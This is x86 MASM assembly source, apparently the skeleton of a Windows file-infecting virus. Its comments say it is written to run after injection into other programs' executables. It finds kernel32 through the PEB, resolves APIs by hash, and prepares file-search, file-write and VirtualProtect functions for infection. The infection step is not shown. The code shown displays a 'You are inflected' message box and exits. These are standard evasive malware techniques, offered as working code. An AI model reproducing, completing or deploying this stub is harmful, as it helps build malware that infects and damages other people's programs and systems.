.386
.model flat, stdcall

option casemap:none 


.code
main:
incode segment

    call Delta
    Delta:
        pop ebp
        sub ebp, offset Delta
    ; Use this technique to make sure our address will correct for any program no matter it's entry point
    ; For example: the injected file will have new EntryPoint (differ with this file's EntryPoint)
    ; But the code need to be runnable correctly in that file too.
    ; so ebp now is the distance 
    ; so every address must be add more ebp
    ; Therefore esp need to be unchange throughout the code

    findkernel32:
        call find_kernel32
        mov [ebp + offset _kernel32dll], eax        ; Save base address of kernel32
  
    getAPIsFromKernel32:
        lea esi, [ebp + offset kernel32FunctionsHash]       ; First entry in list hashFunction
        lea edi, [ebp + offset kernel32FunctionsAddress]    ; First entry in list address of functions
        mov ebx, [ebp + _kernel32dll]
        call getAPIs

    findUser32:
        lea eax, [ebp + offset swUser32dll]
        push eax
        call [ebp + _LoadLibrary]
        mov [ebp + _user32dll], eax

    getAPIsFromUser32:
        lea esi, [ebp + offset user32FunctionsHash]       ; First entry in list hashFunction
        lea edi, [ebp + offset user32FunctionsAddress]    ; First entry in list address of functions
        mov ebx, [ebp + _user32dll]
        call getAPIs

    showMessageBoxA:
        push 0
        push offset swHacked
        push offset swHacked
        push 0
        call _MessageBoxA
        
    exitProcess:
        push 0
        call [ebp + _ExitProcess]

    ; Use PEB technique to get address of Kernal32.dll
    ; @return: base address of kernel32
    find_kernel32:
        ASSUME FS:NOTHING
        mov   eax, fs:[30h]                     ; address of PEB
        mov   eax, [eax + 0ch]                  ; Extract the pointer to the loader data structure.
        mov   esi, [eax + 1ch]                  ; Extract the first entry in the initialization order module list.
        lodsd                                   ; kernel32.dll is at 3rd entry.
        mov esi, eax
        lodsd                                   ; now eax contain address of kernel32.dll
        mov   eax, [eax + 8h]                   ; Grab the module base address and store it in eax
        ret

    ; ebx   (address of library)
    ; return: void
    getAPIs:
        mov eax, [esi]
        cmp eax, 0BBh                               ; until the end of the list
        je endgetAPIs
        push [esi]                                  ; hash of function
        push ebx                                    ; base address library
        call find_function
        mov [edi], eax                              ; save address functions

        add edi, 4
        add esi, 4
        jmp getAPIs
        endgetAPIs:
        ret
    
    ; [esp + 0x24] (library base address)
    ; [esp + 0x28] (function hash)
    ; @return: address of function
    find_function:
        pushad                                  ; Save all registers
        mov ebp, [esp + 24h]                    ; Take the base address of kernel32 and put it in ebp
        mov eax, [ebp + 3ch]                    ; Skip over the MSDOS header to the start of the PE header.
        mov edx, [ebp + eax + 78h]              ; The export table is 0x78 bytes from the start of the PE header. Extract it and start the relative address in edx.
        add edx, ebp                            ; Make the export table address absolute by adding the base address to it.
        mov ecx, [edx + 18h]                    ; Extract the number of exported items and store it in ecx which will be used as the counter
        mov ebx, [edx + 20h]                    ; Extract the names table relative offset and store it in ebx.
        add ebx, ebp                            ; Make the names table address absolute by adding the base address to it.
    find_function_loop:
        jecxz find_function_finished            ; If ecx is zero then the last symbol has been checked and as such jump to the end of the function.
                                                ; If this condition is ever true then the requested symbol was not resolved properly.
        dec ecx
        mov esi,[ebx+ecx*4]                     ; Extract the relative offset of the name associated with the current symbol and store it in esi
        add esi, ebp                            ; Make the address of the symbol name absolute by adding the base address to it.
    compute_hash:
        xor edi, edi
        xor eax, eax
        cld                                     ; Clear the direction flag
    compute_hash_again:
        lodsb                                   ; Load the byte at esi, the current symbol name, into al and increment esi.
        test  al, al                            ; Bitwise test al with itself to see if the end of the string has been reached.
        jz    compute_hash_finished
        ror   edi, 0dh                          ; Rotate the current value of the hash 13 bits to the right.
        add   edi, eax                          ; Add the current character of the symbol name to the hash accumulator.
        jmp   compute_hash_again
    compute_hash_finished:
    find_function_compare:
        cmp   edi, [esp + 28h]
        jnz   find_function_loop
        mov   ebx, [edx + 24h]                  ; Extract the ordinals table relative offset and store it in ebx.
        add   ebx, ebp                          ; Make the ordinals table address absolute by adding the base address to it.
        mov cx,[ebx+2*ecx]                      ; Extract the current symbols ordinal number from the ordinal table.
        mov ebx, [edx + 1ch]                    ; Extract the address table relative offset and store it in ebx.
        add ebx, ebp                            ; Make the address table address absolute by adding the base address to it.
        mov eax,[ebx+4*ecx]                     ; Extract the relative function offset from its ordinal and store it in eax.
        add eax, ebp                            ; Make the function’s address absolute by adding the base address to it.
        mov   [esp + 1ch], eax                  ; Overwrite the stack copy of the preserved eax register so that when popad is finished the appropriate return value will be set.
    find_function_finished:
        popad 
        ret 8

;---================== Data will be located at the end

    swHacked                db      "You are inflected",0

    swUser32dll             db      "user32.dll",0
    swMessageBoxA           db      "MessageBoxA",0

    _kernel32dll            dd      ?
    _user32dll              dd      ?

user32FunctionsAddress:
    _MessageBoxA            dd      00000000h

user32FunctionsHash:
    @MessageBoxA            dd      0bc4da2a8h
                            dd      0BBh                ; end of list


kernel32FunctionsAddress:
    _GetProcAddress         dd      00000000h
    _LoadLibrary            dd      00000000h
    _ExitProcess            dd      00000000h
    _CloseHandle            dd      00000000h
    _CreateFileA            dd      00000000h
    _FindClose              dd      00000000h
    _FindFirstFileA         dd      00000000h
    _FindNextFileA          dd      00000000h
    _GetCurrentDirectoryA   dd      00000000h
    _ReadFile               dd      00000000h
    _SetFilePointer         dd      00000000h
    _WriteFile              dd      00000000h
    _lstrcatA               dd      00000000h
    _VirtualProtect         dd      00000000h

kernel32FunctionsHash:
    @GetProcAddress         dd      7c0dfcaah
    @LoadLibrary            dd      0ec0e4e8eh
    @ExitProcess            dd      73e2d87eh
    @CloseHandle            dd      0ffd97fbh
    @CreateFileA            dd      7c0017a5h
    @FindClose              dd      23545978h
    @FindFirstFileA         dd      63d6c065h
    @FindNextFileA          dd      0a5e1ac97h
    @GetCurrentDirectoryA   dd      0bfc6eb4fh
    @ReadFile               dd      10fa6516h
    @SetFilePointer         dd      76da08ach
    @WriteFile              dd      0e80a791fh
    @lstrcatA               dd      0cb73463bh
                            dd      0BBh                    ; end of list
incode ends

end main